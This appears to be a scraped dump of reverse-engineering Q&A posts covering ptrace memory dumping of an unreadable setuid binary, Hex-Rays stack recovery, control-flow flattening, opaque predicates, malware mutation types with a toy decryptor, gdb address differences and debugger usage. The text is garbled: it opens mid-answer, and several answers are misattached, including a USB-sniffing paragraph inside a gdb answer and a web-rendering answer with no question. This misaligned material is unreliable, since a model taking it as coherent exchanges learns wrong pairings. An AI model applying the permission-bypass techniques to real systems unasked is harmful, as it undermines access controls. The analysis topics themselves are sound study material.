<p>You can see statistics like CPU usage, IO usage, network usage, memory usage, etc. in <code>/proc/$pid</code>: files like <code>status</code>, <code>sched</code> and <code>net/netstat</code> are world-readable (whether the program is actually started with extra privileges or not, the setuid restrictions apply). The one interesting thing I see is the program's network connections. The really juicy stuff, like memory contents (<code>mem</code>) and even open files (<code>fd</code>) is disabled either way. Preloading a library with <code>LD_PRELOAD</code> or running the program with a different <code>LD_LIBRARY_PATH</code> is also disabled either way. Nor will you get a core dump.</p>

<p>So what works? You can see open network connections, maybe one of them will give you a clue or will be spoofable. You can try to figure out what files the program accesses by modifying them when you can, or by running the program from another directory (try making a symbolic link).</p>

<p>If you have access to a chroot jail on the machine, try running the program from there. If you can run a virtual machine which implements shared folders (e.g. VMware or VirtualBox), see if you can access the program from there. This is all about subverting the security of the system: the permissions are designed to hinder you in your task.</p>

<p>An advanced technique is to observe the program under heavy load and try to deduce what it does from the time it takes. Pollute the disk caches and see what files become quickly accessible. See how the swap usage varies depending on what the program does (so you get an idea of how many different pages are in its working set, not just how much total memory it's using). A lot of trial and error will be required. When you know the code and are trying to obtain the data, this is a well-known side channel attack. When you don't know the code, I expect it to be very difficult to obtain useful information this way.</p>

<h2>Dumping the memory contents</h2>

<p>I initially thought you couldn't dump the memory of the program because of the setuid bit (which usually wouldn't be a problem because you'd just copy the executable, but here this isn't possible because the executable is not readable). This turns out to be wrong. If you attach to the program with <code>ptrace</code> before calling <code>execve</code> (like running <code>strace ./bin</code> does), you do have access to <code>ptrace</code> in all its glory, including <code>PTRACE_PEEKDATA</code> and <code>PTRACE_PEEKEXEC</code>. That doesn't run the program setuid, so it may behave differently, but the code and static data loaded into memory are the same either way.</p>

<p>Kudos to <a href=""https://reverseengineering.stackexchange.com/questions/98/how-can-i-analyse-an-executable-with-no-read-permission/110#110"">samuirai</a> for pointing this out.</p>

<p>Here's an overview of how you can dump the program's memory:</p>

<ul>
<li>Fork, and call <code>ptrace(PTRACE_TRACEME, ...)</code> in the child then execute the program (<code>execl(""./bin"", ""./bin"", NULL)</code>).</li>
<li>In the parent, call <code>waitpid</code> to wait for the child to return from <code>execve</code>.</li>
<li>Figure out the address at which the code is loaded. The value of the IP register (obtained through <code>PTRACE_GETREGS</code>) should give a clue, and you can look for file format headers.</li>
<li>Read the child's memory word by word (<code>PTRACE_PEEKTEXT</code>, <code>PTRACE_PEEKDATA</code>).</li>
<li>Reconstruct the file format (e.g. make an ELF binary from text and data sections) if needed. Dump out the data into a file.</li>
<li>Kill the child — it won't even get to execute anything.</li>
</ul>

<p>I was told on email by a very skilled reverser how to handle this, I don't know if he wants me to say his/her name so I'll not say anything.<br></p>

<p>But they said start doing repairs to arrays or structures starting at <code>[sp+####h]</code> and do calculations from that.</p>

<p>So the first part to start repairing is the since it begins with <code>[sp+#h]</code></p>

<pre><code>char *v351; // [sp+4h] [bp-1608Ch]@668 
</code></pre>

<p>Now you go down to</p>

<pre><code>  char *v372; // [sp+14h] [bp-1607Ch]@644
  int v373; // [sp+14h] [bp-1607Ch]@668
  time_t v374; // [sp+18h] [bp-16078h]@1
  ARENA *a5[2]; // [sp+28h] [bp-16068h]@63
  int v376; // [sp+30h] [bp-16060h]@69
</code></pre>

<p>So</p>

<pre><code>  char *v372; // [sp+14h]                                      [0]
  int v373; // [sp+14h]                     14-14 = 0 goes up  [4]
  time_t v374; // [sp+18h] [bp-16078h]@1    18-14 = 4 goes up  [16]
  ARENA *a5[2]; // [sp+28h] [bp-16068h]@63  28-18 = 16 goes up [8]
  int v376; // [sp+30h] [bp-16060h]@69      30-28 = 8 goes up  [4]
  int v377; // [sp+34h] [bp-1605Ch]@61       34-30 = 4 goes up  [ignored]
</code></pre>

<p>So <code>0</code> would mean char? yet it's a pointer to a char (4 bytes)?, Probably shouldn't touch those<br>
The <code>4</code> after would be int which seems right.<br>
The <code>16</code> after looks like <code>2 x 8 bytes</code>.<br>
Since time_t could be 4 bytes or 8 bytes.<br></p>

<p>I checked and time_t is defined as<br></p>

<pre><code>-00016080 var_16080       dd 6 dup(?)             ; offset
</code></pre>

<p>So it thinks it's 4 bytes x 6 which would be 24 bytes? why does it think that? Yes I get that <code>var_16080</code> when I click on the <code>time_t</code></p>

<p>So this is where I get confused I think it's really 8 bytes and all I have to do is make it <code>time_t v374[2]</code></p>

<p>ARENA *a5[2]; looks right 2 pointers of 4 bytes. = 8 bytes and the int after looks right.</p>

<p>Can someone tell me how what to do in certain hard cases if I have to do it all manually I would do it.. </p>

<p>But if there is a way to automate this I'd also appreciate that if anyone can tell me of a plugin or a script to do that.</p>

<p>Here is how I got it down to is it right?</p>

<p>Seems all the array/buffers are only found at the bottom of all the variables all of them are buffers completely (maybe it's just the type of compiler / optimizer this program used). </p>

<p>I wonder what If it probably reuses all the buffers as just one big buffer?</p>
","<p>I'm not sure that it is possible to answer this question without seeing all the function because correctness of local variable type recovery can be done only by understanding of the context where variables are used. </p>

<p>However, I'd suggest the following algorithm for dealing with local variables 
in Hex-Rays:</p>

<ol>
<li><p>As your friend said, do nothing with variables allocated on the registers.</p></li>
<li><p>For all other variables allocated on the stack, do the following:</p></li>
<li><p>Look where this variable is used.</p></li>
<li><p>If you see one of patterns below, act accordingly, but press F5 after each change and review results. Remember, you can revert each type back by pressing Y and entering previous type on it.</p></li>
<li><p>If you see usage of some <strong>different</strong> offsets relative to this variable it may be a structure. Try to create one by right-click on the variable and choosing corresponding menu item. Usage of this variable as function parameter or other connections to already known types may give you a hint about type of the variable. </p></li>
<li><p>If you see not constant offsets (such as offset in another variable) it can be array. Press asterisk (*) on the variable, IDA will suggest the length of the array, it does it relatively good.</p></li>
<li><p>If you see both of those patterns, it is possibly array of structures or more complicated case like array of structures in structure which is member of array and vice versa :) In this case try to find a smallest structure/array and start with it.  </p></li>
</ol>

<p>At all, there are the following possibilities to affect the function stack in Hex-Rays:</p>

<ol>
<li>Changing variable type (press y on the variable, enter type) </li>
<li>Making variable an array (press * on it) </li>
<li>Creating new structure
type on a variable basis (Right click on the variable, corresponding
menu item)</li>
<li>Undefining a variable: Doubleclick on stack variable
will open stack function stack window. Pressing u on a variable will
undefine it. </li>
<li>Merging a variable: if you see that two different
variables are actually the same you can press = and tell to the
decompiler that they are really the same. AFAIR it works in IDA 6.5
and IDA6.5</li>
</ol>

<p>Don't forget to refresh the decompiled code view by pressing F5 after each change to see results.</p>

<p>That's all.</p>

<p>By the way,  there is one point you are probably missing:
IDA and HexRays can make more than one variable on the same place in stack, 
so v369, v370, v371, v372, v373 are using same place in the stack, but are different variables from decompiled code point of view.</p>

"What is a ""control-flow flattening"" obfuscation technique?","5722","","<p>I recently heard about the ""control-flow flattening"" obfuscation which seems to be is used to break the structure of the CFG of the binary program (see <a href=""http://diablo.elis.ugent.be/obfuscation"" rel=""noreferrer"">Diablo obfuscation module</a> and <a href=""https://www.sstic.org/2013/presentation/execution_symbolique_et_CFG_flattening/"" rel=""noreferrer"">Symbolic Execution and CFG Flattening</a>). </p>

<p>Can somebody make an explanation of what is its basic principle and, also, how to produce such obfuscation (tools, programming technique, ...) ? And, it would be nice to know if there are ways to extract the real shape of the control-flow of the program.</p>
","<p>For a good example of this obfuscation, check Apple's FairPlay code, e.g. iTunes or iOS libs. Here's a typical graph of a function which had this obfuscation applied:</p>

<p><img src=""https://i.stack.imgur.com/Xk4L6.png"" alt=""enter image description here""></p>

<p>As you can see, all edges between basic blocks - both conditional and unconditional - has been redirected to a dispatcher node which uses a new artificial variable to decide which block should be jumped to next. This variable is updated at the end of each separated basic block.</p>

<p>Here's the dispatcher node:</p>

<pre><code>LDR    R3, =0xF26A85D2
ADD    R3, R2, R3
CMP    R3, #0x40 ; switch 65 cases
ADDLS  PC, PC, R3,LSL#2 ; switch jump
</code></pre>

<p>It uses <code>R2</code> as the control value.</p>

<p>And here's one of the basic blocks:</p>

<pre><code>LDR  R2, =0x853FD863 ; jumptable 00532EFC case 33
LDR  R1, [SP,#0x130+var_108]
STR  R2, [SP,#0x130+var_134]
LDR  R2, =0xD957A31
STR  R1, [SP,#0x130+var_44]
B    loc_532ED0
</code></pre>

<p>It updates <code>R2</code> with the value which will be used to jump to the next block.</p>

<p>Recovering it shouldn't be <em>too</em> difficult in most cases - just track the control variable updates and replace jumps to the dispatcher node with jumps to the next block corresponding to the new control variable value.</p>

"What are the targets of professional reverse software engineering?","5687","","<p>At the professional level, for what purpose is reverse software engineering used? What software is targeted and why?</p>

<p>For reasonably complex compiled code that's doing something novel, making meaningful insights into how that code operates via reverse engineering seems like it would be enormously intensive of expertise, labor, and time. In particular, I imagine that hiring competent assembly programmers is extremely difficult and possibly expensive. And yet, I haven't the foggiest idea where entities with the resources to do so would want to spend those resources.</p>

<p>This is my list of possibilities...</p>

<ol>
<li>Writing malware</li>
<li>Writing counter-malware</li>
<li>Maybe analyzing competitors products?</li>
</ol>

<p>It's not a great list. What is the reality here? What sort of software justifies the expense to be reverse engineered?</p>

<p><em>See the comments on 0xC0000022L's answer for some refinement of the question.</em></p>
","<p>Reverse engineering is commonly used in many ways.  Here is a list of just some of the most common professional activities where reverse engineering is involved.</p>

<ol>
<li>Malware research. Withouth doing reverse engineering, it's hard to determine what an actual piece of malware does, how and, more important, how to clean it or prevent infections.</li>
<li>Plagiarism detection: Reverse engineering is often legally used to determine if company or particular X plagiarized code from company or particular Y.</li>
<li>Forensics.</li>
<li>Compatibility. Reverse engineering supported, and still does, many open source projects like Samba or Star/Libre/OpenOffice. Without professional (and hobbistic) reverse engineers, nobody would have been able to write a software like the previous ones as there was no specification available at all for the protocols or file formats involved. If you're using Libre/OpenOffice or MacOSX or Linux, you're actually using the result of the work of many reverse engineers during many years.</li>
<li>Vulnerability research/development. In order to discover undocumented features, vulnerabilities or backdoors left by the company, programmers or a 3rd party, reverse engineering is naturally required.</li>
<li>Modification of legacy programs. This is one of the most other common tasks I have seen in this field: company X bought program Y but the company producing it, Z, disappeared and they have no source code at all. That company X contracts reverse engineering services to fix bugs and/or adapt the old (dead) application for their own purposes. If the program was also protected, the reverse engineers would also need to first break the the copy protection.</li>
<li>Analysing competitors products. Naturally, this is a very common thing. Specially when talking about hardware products. And it, by the way, happens in all fields. Do you think that Porsche doesn't reverse engineer Ferrari cars and the other way around?</li>
<li>Source code recovery. Company X lost the source code of one of their programs/products for whatever reason and they only have the binaries. That company contracts reverse engineering services to reconstruct/recover the source code.</li>
<li>Analysing foreign governments hardware and software. You get the idea.</li>
<li>Binary patches development. Some products cannot be fixed because they are very slow fixing bugs (Oracle comes to mind...) or the company disappeared or simply don't care. In this case, reverse engineering services can be contracted to develop binary patches to be applied to the product in order to fix bugs or vulnerabilities.</li>
</ol>

"When to use Windbg and Ollydbg?","5511","","<p>According to what I know :WinDbg uses debugging information (pdb/symbol files) for debugging.So ,for example say I get a unknown exe (malicious) can I debug it since I'll not be having its .pdb. Is WinDbg best suited to analyze memory dumps and crash issues only?</p>

<p>Ollydbg being a ring 3 debugger is good to analyze/debug malicious exe's but doens't support unknown dlls(there is loaddll but you have to know which function the dll exports and there parameters) and rootkits(sys files).</p>

<p>So If I have a dll and a .sys file how can I debug it using olly or winDbg?</p>

<p>Note:I am a noob I may be wrong in what I know.I don't have the resources to buy IDAPro :-). </p>
","<p>Even the <a href=""https://www.hex-rays.com/products/ida/support/download_freeware.shtml"" rel=""nofollow"">free version of IDA Pro</a> is worth having. Finding the general structure of an unknown binary is much easier with it than with anything else. If you have an unknown DLL, it will show you which exports it has, and looking at the assembly code helps you guess the parameters.</p>

<p>In most cases, to debug a .dll, you'll want to write a small program to call several of its exports one after another anyway. You can use ollydbg or windbg to load your .exe and trace through the .dll code.</p>

<p>My personal experience is that in many cases, the best approach would be using IDA first to get an overview over the unknown binary, then use ollydbg or the IDA debugger to trace on the processor instruction level, and only use a high level debugger when i have some symbols to trace on the source code level.</p>

<p>I have bought IDA and i think the current version of the debugger is much better than the free 5.0 one, so you might want to skip the IDA debugger entirely, but you'll still use it for static analysis. And i tend to use Linux much more than Windows (and if on windows, use IDA or Ollydbg), so i have a lot more experience with gdb than with windbg.</p>

<p>Still, each of these tools has its strenghs and weaknesses, and if you seriously want to go into binary analysis, you'll need each of them in the long run. If i were you, i'd invest a day or two into each of them. Once you're comfortable with them, you'll find you'll use each of them depending depending on your specific situation.</p>

"What is an ""opaque predicate""?","5450","","<p>I saw the term of <em>opaque predicates</em> several times in obfuscation papers. As far as I understand it, it refers to predicates that are hard to evaluate in an automated manner. Placing it at strategical points of the program (<code>jmp</code>, <code>test</code>, ...) can mislead the analysis of a program by automatic tools.</p>

<p>My definition is lacking of precision and, moreover, I have no idea on how to estimate the <em>opacity</em> of such a predicate (its efficiency). So, can somebody give a proper definition and maybe a few examples ?</p>
","<p>The answers already in this thread are good ones.  In a nutshell, an opaque predicate is ""something that a program analysis might miss, if the program analysis is not sophisticated enough"".  Denis' example was based on the inverse of constant propagation, and served as an anti-checksum mechanism.  Joxean's <code>SetErrorMode</code> example was an environment-based opaque predicate that was used for dynamic anti-emulation.  Two of Ange's answers were also dynamic anti-emulation; based upon the environment, and based upon uncommon platform features.  Ange's other example was more like an anti-disassembly trick via indirect addressing.</p>

<p>In the academic literature, an opaque predicate is referred to as a branch that always executes in one direction, which is known to the creator of the program, and which is unknown a priori to the analyzer.  The notion of ""hardness"" of an opaque predicate is deliberately omitted from this definition.  Academic predicates are often based upon number-theoretic constructions, aliasing relationships, recursive data structures; basically anything that is commonly understood by program analysis researchers to cause problems for a program analysis tool.  </p>

<p>My favorite researcher Mila Dalla Preda has shown that the ability for an abstract interpreter to break a given category of opaque predicate is related to the ""completeness"" of the domain with respect to the property tested by the predicate.  She demonstrates by using mod-k-based opaque predicates, and elicits a family of domains that are complete (i.e. incur no abstract precision loss) for mod-k with respect to common transformers (addition, multiplication, etc).  Then she explores the use of obscure theoretical constructions such as completeness refinement to automatically construct a domain for breaking a certain category of predicate.

"What are the differences between metamorphic, oligomorphic and polymorphic malware?","5351","","<p>Malware use several methods to evade anti-virus software, one is to change their code when they are replicating. I saw mainly three type of techniques in the wild which are: <em>metamorphic malware</em>, <em>oligomorphic malware</em> and <em>polymorphic malware</em> (I might have missed one). What are the main differences between theses techniques and what do they do ?</p>
","<p>In order of increasing complexity: oligomorphic, polymorphic, metamorphic.</p>

<p>The first two terms are generally applied to decryptors.  We (anti-virus industry) define them this way: oligomorphic - decryptor with few variable elements, which does not affect the size or shape of the code.  It means that the variable elements are usually fixed-size instructions, but it can also apply to the register initialization.</p>

<h1>Oligomorphic example</h1>

<pre><code>std ;fake, might be replaced by cld / nop / xchg ax, cx / ...
mov cx, size
mov ax, ax ;fake, might be replaced by mov bx, bx / or cx, cx / ...
mov si, decrypt_src
cld ;fake
mov di, decrypt_dst
or ax, ax ;fake
mov bl, key
and bp, bp ;fake
decrypt:
xor [di], bl
xchg dx, ax ;fake
inc di
cld ;fake
loop decrypt
</code></pre>

<p>In this case, the <code>di</code> register could be exchanged with <code>si</code>, for example.  Very simple replacement.</p>

<h1>Polymorphic</h1>

<p>decryptor with potentially highly variable elements, which does affect the size and/or shape of the code.  It means that all kinds of changes can be applied, including subroutine creation, large blocks of garbage instructions, code ""islands"", or even algorithmic register initialisation (example <a href=""http://pferrie.host22.com/papers/bounds.pdf"" rel=""nofollow"">here</a>).</p>

<h1>Metamorphic</h1>

<p>highly variable elements are applied directly to the body.  There is generally no decryptor in this case.  The same techniques for polymorphism are applied to the code itself.  The most famous example of this is the Simile virus from 2002 (details <a href=""http://pferrie.host22.com/papers/simile.pdf"" rel=""nofollow"">here</a>).  There's a detailed paper on the subject with actual examples <a href=""http://pferrie.host22.com/papers/metamorp.pdf"" rel=""nofollow"">here</a>)</p>

"How to predict address space layout differences between real and gdb-controlled executions?","5242","","<p>It's something that puzzle me for a long time. I can observe that there is a difference between the real execution of a program and the <code>gdb</code>-controlled one.</p>

<p>But, here is an example:</p>

<ol>
<li><p>First, here is the example code (we use an automatic variable to get the location of the stack):</p>

<pre><code>#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;

int main ()
{
  char c = 0;

  printf (""Stack address: %p\n"", &amp;c);

  return EXIT_SUCCESS;
}
</code></pre></li>
<li><p>Then, we disable the ASLR (we use the personality flags of the process and not the system-wide method through <code>/proc/sys/kernel/randomize_va_space</code>):</p>

<pre><code>$&gt; setarch `uname -m` -R /bin/bash
</code></pre></li>
<li><p>Then, get a run in the real memory environment:</p>

<pre><code>Stack address: 0x7fffffffe1df
</code></pre></li>
<li><p>And, the same through <code>gdb</code>:</p>

<pre><code> (gdb) r
 Starting program: ./gdb-against-reality
 Stack address: 0x7fffffffe17f
 [Inferior 1 (process 5374) exited normally]
 (gdb) 
</code></pre></li>
</ol>

<p>So, here we have a difference of 96 bytes between the two runs. But, how can I predict this difference for a given program without having it running in the <em>real</em> memory layout (just by knowing the <code>gdb</code> memory layout) ?</p>

<p>And, also, from where/what is coming this difference ?</p>
","<p>There could be other factors involved, but my guess would be that changes in the process environment variables, which are stored on the stack, are what's causing this issue.</p>

<p>Running a small <a href=""https://stackoverflow.com/questions/2085302/printing-all-environment-variables-in-c-c"">program</a> that just prints out the environment variables reveals a couple variations in environment variables when run inside vs outside gdb on my system.</p>

<pre><code>int main(int argc, char **argv, char** envp)
{
  char** env;
  for (env = envp; *env != 0; env++)
  {
    char* thisEnv = *env;
    printf(""%s\n"", thisEnv);    
  }
}
</code></pre>

<p>First, when running under gdb, there is a LINES variable that isn't present when the process is started outside of gdb:</p>

<pre><code>LINES=83
</code></pre>

<p>Secondly, the underscore environment variable is different. When running outside of gdb, it is set to the name of the executable:</p>

<pre><code>_=./gdbtest
</code></pre>

<p>But when started from inside gdb, it is set to the path of the gdb binary:</p>

<pre><code>_=/usr/bin/gdb
</code></pre>

<p>You can try to run the program normally, then attach to it with gdb/gdbserver, which should avoid these variations in environment variables (assuming that is in fact what is causing your problem).</p>

<p>If your process is short-lived, it can be hard to pause the process before it exits. Maybe someone else has some good suggestions on starting a process in a paused state; I usually use a second program like <a href=""https://code.google.com/p/botox/source/browse/trunk/src/botox.c"" rel=""nofollow noreferrer"">this one</a> to catch the process as it is starting and pause it so I can attach a debugger to it.</p>

<p>There's also the more DIY solution which involves running the process you want to monitor in a virtual machine such as VirtualBox and then routing the traffic which goes through the USB ports to your own dissector. You can use <a href=""http://wiki.wireshark.org/CaptureSetup/USB"">Wireshark as a dissector</a> for VM USB traffic.</p>

","<p>You can get pretty close, but if the site uses PHP, ASP.NET, or some other form of server-side html rendering, you'll never be able to completely reproduce a copy of it. This is because that server-side rendering code is just that, only on the server, and it is never sent down to the browser. </p>

<p>But if you want to ignore all that, you can certainly assume the html that comes back is static and work from there. The first request made to a website (once all redirects are done) is always a single response containing an html page. The browser then renders this html onto the window. It will download and run any scripts (js) when it hits a script tag. The scripts are run in-place, even if the whole html page hasn't been rendered yet. This is why web frameworks like Angular or React will recommend putting the script tags after the main content container has been rendered. The process is similar for style sheets. Each style tag will download a style sheet and compile it. </p>

<p>The great thing is that all this is laid out in order in the network tab of your browser's developer tools. You can view each http request made to the website's server, including the latency, full request contents, and full response contents, and a bunch of other helpful information. I'm not sure how it works for Firefox or other browsers, but if you're on Chrome you can open the developer tools by hitting F12 on Windows or Alt+Shift+I on Mac. There's a bunch of other really cool stuff you can see as well. </p>

"Which python library for parsing Linux ELF files?","4922","","<p>I want to be able to parse 32 and 64 bit ELF files - but not create or modify them (e.g. as discussed in <a href=""https://reverseengineering.stackexchange.com/questions/1843/what-are-the-available-libraries-to-statically-modify-elf-executables"">this thread</a>). The ELF binaries may possibly come from embedded Linux systems, that is, the library should not be irritated by MIPS, ARM and other non-x86 architectures.</p>

<p>What I have considered: </p>

<ul>
<li><a href=""https://github.com/eliben/pyelftools"" rel=""nofollow noreferrer"">pyelftools</a> (my currently favored option)</li>
<li><a href=""https://github.com/crackinglandia/pylibelf"" rel=""nofollow noreferrer"">pylibelf</a></li>
<li><a href=""https://code.google.com/p/pydevtools/"" rel=""nofollow noreferrer"">pydevtools</a></li>
<li>Also an option: using a C library and ctypes.</li>
</ul>

<p>Do I have forgotten something?
Which of the above options would you prefer? </p>

<p>For those who had some practical experience with pylibelf or pydeftools: These seem no longer updated (last commit: 2013 and 2012), are they mature enough?</p>
","<p>Take a look at radare2. It can parse file formats (see <a href=""http://radare.today/parsing-a-fileformat-with-radare2/"" rel=""nofollow"">here</a> for an example of parsing the ELF header).</p>

<p>Radare2 supports multiple architectures and is being actively developed. On top of that it has bindings for a lot of languages, including Python of course. Read through the <a href=""https://github.com/radare/radare2-bindings"" rel=""nofollow"">bindings source code</a> to see it is pretty straightforward to script it.</p>

"DLL - Dynamic Analysis on IDA","4914","","<p>I'm ""middle-new"" in re and I have to debug a dll's function. How can I tell to IDA : start function XXX with parameters A, B and C ?
Is there a solution or a plugin doing that ? I've tried doing that with rundll32.exe but unsucessfully.</p>

<p>I have no experience on ollydbg this is why I ask for a IDA solution</p>

<p>Thanks for helping !</p>
","<p>Based on <a href=""https://stackoverflow.com/questions/3207365/how-to-use-rundll32-to-execute-dll-function"">this answer</a>, rundll only supports running functions with a specific signature. I would recommend writing a simple executable that loads it. For example, in c, you could call <a href=""http://msdn.microsoft.com/en-us/library/windows/desktop/ms684175%28v=vs.85%29.aspx"" rel=""nofollow noreferrer"">LoadLibrary</a>(""yourdll.dll"") and then <a href=""http://msdn.microsoft.com/en-us/library/windows/desktop/ms683212%28v=vs.85%29.aspx"" rel=""nofollow noreferrer"">GetProcAddress</a>(""yourfunc"") and then call it that way. See MSDN (linked) for more info.</p>

<p>In IDA, you would then give your executable as the process, but your dll as the input file. That will allow you to set breakpoints that IDA will set when the dll is loaded. It also gives you control over the parameters since you can just pass them through from the command line.</p>

"Catch MessageBox call with OllyDbg","4840","","<p>I am trying to learn to get around Ollydbg, using Lena's tutorial. The latter is based on v.1.10 but I'm using 2.01. So far that went ok. </p>

<p>However, I now find myself in a situation where my result differs a lot from the tutorial (no 4). </p>

<p>I'm trying to catch the call for a messagebox in the code. The tutorial describes I should, with the messagebox open, pause Ollydbg, then return to the application and close the messagebox. This would make Ollydbg break after I clicked the box away and I would land right after the messagebox call in the code. </p>

<p>In my case though, as soon as I click pause, Olly leaves the main application module, landing on RETN in a subroutine of USER32.GetMessageA</p>

<p>Now I can't get back to the application at all, it's blocked. I have to continue the debugger in order to be able to get back to it again but this way I get no info about the messagebox. </p>

<p>Any tips how to proceed in order to get the expected result? I guess in this specific example I could just search for all messagebox calls in the code but that's hardly a good way, especially with large apps. </p>

<p>A related question, is there a possibility to ""look back"" on what happened, as in which code was called up to a certain moment? </p>

<p>Apologies if any of this doesn't make much sense. </p>

<p>no you cant close a paused MessageBox not in v 1.10 or not in v 2.01<br>
it is simply not possible period<br>
you must be misreading or misunderstanding the tutorial</p>

<p>you need to set a breakpoint some where on any of the return address and continue execution 
or you can select a return address in call stack and hit <kbd>f4</kbd> to execute until return</p>

"IDA Pro function stack frame view","4810","","<p>IDA Pro displays certain buffer or padding above (at lower addresses) local variables in stack frame view. For instance:</p>

<p><strong>Example 1.</strong><br> 
The following screen shot of stack frame view shows 12 bytes (included in the red box) buffer: </p>

<p><img src=""https://i.stack.imgur.com/wB1ok.png"" alt=""enter image description here""></p>

The following screen shot of a different stack frame view shows 12 bytes buffer again:</p>

<p><img src=""https://i.stack.imgur.com/ForTX.png"" alt=""enter image description here""></p>

<p>I understand that IDA marked it as <strong><code>db ?; undefined</code></strong> because it couldn't figure out how it was used. I also realize that IDA automatically calculates size of a stack frame by monitoring ESP. I would assume it might have something to do with non-volitile register save area. However, in <strong>Example 1</strong> it clearly shows <strong><code>Saved regs: 0</code></strong> and in <strong>Example 2</strong> it shows <strong><code>Saved regs: 4</code></strong>. I am puzzled, and here go my questions:</p>

<p>Why does IDA Pro display certain buffer or padding above (at lower addresses) local variables in stack frame view? Is it a coincidence that both views show exactly <strong>12 bytes</strong> buffer? Is it something particular to certain calling convention or complier? </p>
","<p>Thank you all so much for your answers and comments. While reading your comments and preparing to update my question, I found the answer. </p>

<p>I must give credit to <a href=""https://reverseengineering.stackexchange.com/users/60/igor-skochinsky"">Igor Skochinsky</a>, who asked me to provide functions' prolog instructions. Both functions use the <a href=""http://en.wikipedia.org/wiki/X86_calling_conventions#cdecl"" rel=""nofollow noreferrer"">cdecl calling convention</a>. However, calling convention has nothing to do with this buffer. This is what the prolog looks like:</p>

<pre><code>push    ebp
mov     ebp, esp
sub     esp, &lt;size of local vars&gt;
push    ebx
push    esi
push    edi
</code></pre>

<p>This buffer reflects <strong>three push instructions</strong> for registers EBX, ESI, EDI. These registers are categorized as <strong>Callee Saved Registers</strong> and this ""buffer"" is called <strong>Non-Volatile Register Save Area</strong>. </p>

<p>In accordance to x86 convention (it is also applicable to x64), registers are divided into <strong>Caller Saved Registers</strong> and <strong>Callee Saved Registers</strong>. </p>

<p>Caller saved registers are also known as volatile registers. Those are core CPU registers such as EAX, EDX, and ECX. A calling function (Caller) is responsible for saving volatile registers onto usually runtime stack before making a call. </p>

<p>Callee saved registers are known as non-volatile registers. Those are core CPU registers such as EBX, ESI, EDI, ESP, and EBP. It is assumed by convention, that values in those registers will be preserved by a callee function. In case any of the non-volatile registers are going to be used within a callee,  the callee is responsible to save the registers onto runtime stack. In addition, the callee is responsible to restore those registers before returning to a caller function.</p>

<p>The way volatile and non-volatile registers used is rather compiler driven. The following paper <a href=""http://www.cs.virginia.edu/~evans/cs216/guides/x86.html"" rel=""nofollow noreferrer""><strong>x86 Assembly Guide</strong></a> describes Caller and Callee rules in more detail. </p>

"Reverse Engineering of data structures in games","4785","","<p>I am currently participating in a reverse code engineering seminar for my studies in informatics: games engineering and was assigned the topic about ""Identifying data structures"". After an extensive talk with my supervisor we both came to the conclusion that it would make sense that i combine the topic with reversing game binaries.
Our deliverables are a 15 page paper and a small tool implementing the techniques we talk about in the paper. We do not necessarily need to invent a new technique. </p>

<p>I already did some research about reverse engineering data structures in general and came up with mostly tools that automatically reverse engineer data structures from binary execution (e.g. <a href=""https://www.utdallas.edu/~zxl111930/file/Rewards_NDSS10.pdf"">https://www.utdallas.edu/~zxl111930/file/Rewards_NDSS10.pdf</a>)</p>

<p>Now my question is: What would be a reasonable tool to program or a technique to write about in relation to reversing data structures from video game binaries (like World of Warcraft)? Is the method mentioned in the paper above still applicable to game binaries or are there any other known techniques?</p>

<p>I do have some experience when it comes to reverse engineering, but i am no where near ""pro""-level. I am mostly working on a Windows (x64) platform.</p>
","<p>Side Note: WoW, or any comparable MMORPG, is probably a bad target for your research, because many of those feature various anti-hack, anti-cheat or anti-botting techniques, which will probably detect what you're doing.</p>

<p>I'm far from being an expert on this myself, but i've disassembled and tried to understand a 20 year old game as a hobby project recently. The executable has a size of 800 KB, IDA detected about 1750 functions in it, 250 of which were C/C++ library functions. Needless to say, i spent quite some time looking at various functions and checking the strings they used without understanding too much.</p>

<p>What brought the breakthrough for me was when i found out how the compiler handled class construction; each class constructor calls a <code>malloc()</code>-like function (with the size as parameter), then calls the constructor of the superclass, then initializes the methods (there is no vtable like in more modern compilers; the compiler initializes every ""function pointer"" individually) and class variables. Cross-referencing those <code>malloc()</code> calls, checking the sizes of the classes allocated, and following the chains of ""constructor calls superclass constructor"" immediately gave me an idea of the whole class tree and the size of each class.</p>

<p>Also, i got an idea of which function was a subclass method of which other function in the main class, which brought a lot of insight into the purpose of those functions, as as i knew which function was a class method of which class, it was quite easy to track the <code>this</code> pointer of the function, track its dereferences, and find out which class element was used as integer, double, or pointer type, and in case of pointers, know which other class type they pointed to.</p>

<p>This was my first exposure to IDA, so i knew nothing about its scripting capabilities and started learning about them when things became too repetitive; if i had to do the same now, i'd probably script/automate a lot of what i did manually.</p>

<p>I think this might even be easier with modern C++ compilers that use vtables in a predictible way; check where the vtables get assigned to find out where classes get instantiated; check the superclass-constructor calls to find out about class hierarchy; check the sizes in <code>malloc</code>/<code>new</code> calls to get structure/class sizes; track the <code>this</code> pointers in class methods (which are easily identified through the vtables) to find out how the elements are used. All this can be done using static analysis, so you don't even have to care much about how anti-cheat/anti-debug techniques might affect the outcome.</p>

"Paste hex bytes into IDA Pro Hex View","4770","","<p>Is it possible to paste a series of bytes into hex view of IDA? Say I have a large buffer I need to fill with a specific value, and I have it in the form most hex editors output... 0A AB EF FF 00 01... is there some quick way to write this value to a segment of the hex view? Or do this through IDAPython?</p>

<p><strong>Edit:</strong></p>

<p>Solved using PatchByte as suggested below:</p>

<pre><code>def PatchArr(dest, str):
  for i, c in enumerate(str):
    idc.PatchByte(dest+i, ord(c));

# usage: patchArr(start address, string of bytes to write)
patchArr(0xCAFEBABE, ""\x01\x02\x03"")
</code></pre>

<p>Note that I am not a fan of edits to volatile debug memory causing IDA to complain about the IDB being patched post-debug...</p>
","<p>While in IDA's Hex View you can go to <strong>Edit->Patch Program->Change Byte</strong>, but I think this only lets you patch 16 bytes at a time. If you need to patch more bytes than that you can use IDAPython's <strong>idc.PatchByte</strong> / <strong>idc.PatchWord</strong> / <strong>idc.PatchDword</strong> to change bytes in the IDA database.</p>

<p>EDIT:</p>

<p>Just a quick note, if you want your patches applied to the original file that you loaded into IDA, you need to go to <strong>Edit->Patch Program->Apply patches to input file</strong> after you patch the bytes in the idb.</p>

"How to use sysenter under Linux?","4765","","<p>I would like to know what are the different ways to perform a system
call in x86 assembler under Linux. But, with no cheating, only
assembler must be used (i.e. compilation with <code>gcc</code> must be done with
<code>-nostdlib</code>).</p>

<p>I know four ways to perform a system calls, namely:</p>

<ul>
<li><code>int $0x80</code></li>
<li><code>sysenter</code> (i586)</li>
<li><code>call *%gs:0x10</code> (vdso trampoline)</li>
<li><code>syscall</code> (amd64)</li>
</ul>

